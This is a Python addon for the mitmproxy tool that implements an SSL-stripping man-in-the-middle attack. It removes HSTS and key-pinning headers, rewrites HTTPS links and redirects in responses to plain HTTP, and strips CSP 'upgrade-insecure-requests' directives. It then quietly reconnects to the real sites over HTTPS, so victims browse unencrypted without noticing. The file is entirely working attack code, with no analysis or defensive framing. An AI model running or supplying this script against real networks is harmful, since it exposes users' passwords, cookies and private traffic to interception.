import re
import urllib.parse
import typing
from mitmproxy import http

# Set to store all the secure hosts
allSecureHosts = set()

def requestFromWebsite(httpFlow):
    # Remove certain headers from the request
    httpFlow.request.headers.pop('If-Modified-Since', None)
    httpFlow.request.headers.pop('Cache-Control', None)
    httpFlow.request.headers.pop('Upgrade-Insecure-Requests', None)

    # If the request's host is in the set of secure hosts, modify the scheme, port, and host of the request
    if httpFlow.request.pretty_host in allSecureHosts:
        httpFlow.request.scheme = 'https'
        httpFlow.request.port = 443
        httpFlow.request.host = httpFlow.request.pretty_host

def responseFromWebsite(httpFlow):
    assert httpFlow.response
    # Remove certain headers from the response
    httpFlow.response.headers.pop('Strict-Transport-Security', None)
    httpFlow.response.headers.pop('Public-Key-Pins', None)

    # Replace 'https://' with 'http://' in the response content 
    httpFlow.response.content = httpFlow.response.content.replace(b'https://', b'http://')

    # Remove the 'upgrade-insecure-requests' meta tag from the response HTML
    pattern_meta = br'<meta.http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.?>'
    httpFlow.response.content = re.sub(pattern_meta, b'', httpFlow.response.content, flags=re.IGNORECASE)

    # If the response's 'Location' header starts with 'https://', modify it to 'http://'
    if httpFlow.response.headers.get('Location', '').startswith('https://'):
        websiteLocation = httpFlow.response.headers['Location']
        hostWebsite = urllib.parse.urlparse(websiteLocation).hostname
        if hostWebsite:
            allSecureHosts.add(hostWebsite)
        httpFlow.response.headers['Location'] = websiteLocation.replace('https://', 'http://', 1)

    # Remove 'upgrade-insecure-requests' directive from the 'Content-Security-Policy' header
    headerWebsite = httpFlow.response.headers.get('Content-Security-Policy', '')
    if re.search('upgrade-insecure-requests', headerWebsite, flags=re.IGNORECASE):
        csp = httpFlow.response.headers['Content-Security-Policy']
        newHeader = re.sub(r'upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
        httpFlow.response.headers['Content-Security-Policy'] = newHeader